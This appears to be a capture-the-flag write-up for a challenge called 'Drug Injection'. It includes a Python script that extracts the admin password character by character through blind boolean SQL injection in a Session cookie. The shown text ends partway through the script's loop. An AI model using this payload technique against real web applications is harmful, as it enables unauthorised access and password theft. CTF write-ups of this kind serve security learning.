## Drug Injection Challenge Solver

### Introduction
This script is designed to solve the Drug Injection challenge, which involves SQL injection on a login page.

### Challenge Details
I made a Drug awareness website for my Drug Addict friend as a joke to help him get over his addiction. He kept complaining about not being able to login. He Scored an injection drug. I tried to convince him that he should stop getting High before he tries to login. injections won't always help u to get HIGHer access. He was not satisfied with just a single injection, he wanted to try Double Dose. How do I convince him to stop. Help me spread awareness.

### Script Description
Flag is the admin's password.

There are 2 points where you can inject your payload and perform SQL injection.
1. Login page
2. Cookie value (as the cookie is directly taken from the database according to the username)

Here is the script for the end point 2: 

```python
import requests

# Welcome page URL of the challenge
url = '<url>/welcome.php'

r = requests.Session()

cookie1 = {
    'Session': '<Your cookie value>'
}

res = r.get(url=url, cookies=cookie1)

char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}{"

sess_cookie = cookie1['Session']
print(sess_cookie)

count = 1
password = ''
while count <= 57:
    for char in char_set:
        # SQL injection payload
        payload = "' AND (SELECT SUBSTRING(password, " + str(count) + ", 1) FROM users WHERE username='admin')='" + char
        cookie = {'Session': sess_cookie + payload}
        test = r.get(url=url, cookies=cookie)

        if "Welcome, Sir!" in test.text:
            password += char
            print(f"[+] password: {password}")
            count += 1
